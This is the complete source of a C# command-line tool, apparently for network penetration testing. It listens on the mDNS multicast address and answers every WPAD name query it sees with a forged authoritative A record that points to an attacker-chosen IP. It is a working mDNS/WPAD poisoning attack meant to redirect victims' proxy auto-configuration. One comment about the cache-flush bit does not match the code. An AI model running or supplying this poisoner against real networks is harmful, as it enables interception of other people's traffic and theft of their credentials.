using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace MdnsSniffer
{
    class Program
    {
        static async Task Main(string[] args)
        {

            if (args.Length < 2)
            {
                Console.WriteLine("Usage: mdns_responder <advertise-ip> <bind-ip>");
                return;
            }

            if (!IPAddress.TryParse(args[0], out var advertisedAddress))
            {
                Console.WriteLine($"Invalid IP: {args[0]}");
                return;
            }

            if (!IPAddress.TryParse(args[1], out var bindAddress))
            {
                Console.WriteLine($"Invalid IP: {args[1]}");
                return;
            }



            Console.WriteLine($"Advertising IP: {advertisedAddress}");
            const int MdnsPort = 5353;
            var multicastAddress = IPAddress.Parse("224.0.0.251");

            using var udp = new UdpClient(AddressFamily.InterNetwork);

            // Allow multiple listeners (common for mDNS)
            udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            try { udp.Client.ExclusiveAddressUse = false; } catch { /* ignore on platforms that disallow */ };

            udp.Client.Bind(new IPEndPoint(bindAddress, MdnsPort));

            udp.JoinMulticastGroup(multicastAddress);

            Console.WriteLine($"Binding on {bindAddress}");
            Console.WriteLine("Listening for mDNS queries on 224.0.0.251:5353 ... (Ctrl+C to quit)\n");

            while (true)
            {
                try
                {
                    var result = await udp.ReceiveAsync();
                    var buf = result.Buffer;            // raw packet data (bytes)
                    var remote = result.RemoteEndPoint; // IP/port of sender

                    try
                    {
                        // Try to parse the packet as a DNS message.
                        int offset = 12;
                        string name = ReadNameSimple(buf, ref offset);
                        //Console.WriteLine($"Name: {name}");
                        
                        ushort ancount = ReadUInt16(buf, 6);
                        //only respond to Questions to avoid Answer loop
                        bool isQuestion = ancount == 0;

                        if (name.Contains("wpad", StringComparison.OrdinalIgnoreCase) && isQuestion)
                        {
                            byte[] response = BuildMdnsAResponse(name, advertisedAddress);
                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] WPAD Traffic found from {remote.Address}! Sending Response...");

                            var sent = await udp.SendAsync(response, response.Length, remote);

                        }

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("  Parse error: " + ex.Message);
                    }

                }
                catch (SocketException sx)
                {
                    // Thrown when a low-level network error occurs (connection reset, etc.)
                    Console.WriteLine("Socket error: " + sx.Message);
                    break;
                }
            }
        }

        private static byte[] BuildMdnsAResponse(string fqdn, IPAddress ipv4)
        {
            if (ipv4.AddressFamily != AddressFamily.InterNetwork)
                throw new ArgumentException("Only IPv4 supported in this helper");

            var bytes = new List<byte>(256);

            // --- DNS Header (12 bytes) ---
            // ID=0 for mDNS, QR=1 (response), AA=1 (authoritative), others 0.
            // Flags: 1000 0000 0000 0000 (QR) + 0000 0100 0000 0000 (AA) = 0x8400
            ushort id = 0;
            ushort flags = 0x8400;
            ushort qd = 0;       // we don't echo the question
            ushort an = 1;       // one answer
            ushort ns = 0;
            ushort ar = 0;

            void W16(ushort v) { bytes.Add((byte)(v >> 8)); bytes.Add((byte)(v & 0xFF)); }
            //Build mDNS header
            W16(id);
            W16(flags);
            W16(qd);
            W16(an);
            W16(ns);
            W16(ar);

            // --- Answer RR ---
            // NAME
            WriteName(bytes, fqdn);

            // TYPE = A (1), CLASS = IN (1) with cache-flush bit set (0x8000)
            W16(1);                   // TYPE A
            W16(1);// CLASS IN with no cache flush

            // TTL: typical mDNS TTL for address records is 120 seconds
            bytes.Add(0); bytes.Add(0); bytes.Add(0); bytes.Add(120);

            // RDLENGTH = 4, RDATA = IPv4 bytes
            W16(4);
            var addr = ipv4.GetAddressBytes();
            bytes.AddRange(addr);

            return bytes.ToArray();
        }

        private static void WriteName(List<byte> b, string fqdn)
        {
            foreach (var label in fqdn.Split('.'))
            {
                if (label.Length == 0) continue;
                b.Add((byte)label.Length);
                b.AddRange(Encoding.UTF8.GetBytes(label));
            }
            b.Add(0); // end of name
        }

        private static string ReadNameSimple(byte[] msg, ref int offset)
        {
            var parts = new List<string>();

            while (true)
            {
                // Each label starts with a length byte
                if (offset >= msg.Length)
                    throw new IndexOutOfRangeException("Unexpected end of message while reading name.");

                byte len = msg[offset++];

                // 0 means "end of name"
                if (len == 0)
                    break;

                if (offset + len > msg.Length)
                    throw new IndexOutOfRangeException("Label length exceeds buffer.");

                // Read label and decode as ASCII/UTF-8
                var label = Encoding.UTF8.GetString(msg, offset, len);
                parts.Add(label);

                // Move past this label
                offset += len;
            }

            // Join labels with dots: ["_services","_dns-sd","_udp","local"] -> "_services._dns-sd._udp.local"
            return string.Join('.', parts);
        }

        // to parse DNS header
        private static ushort ReadUInt16(byte[] b, int i) => (ushort)((b[i] << 8) | b[i + 1]);

    }
}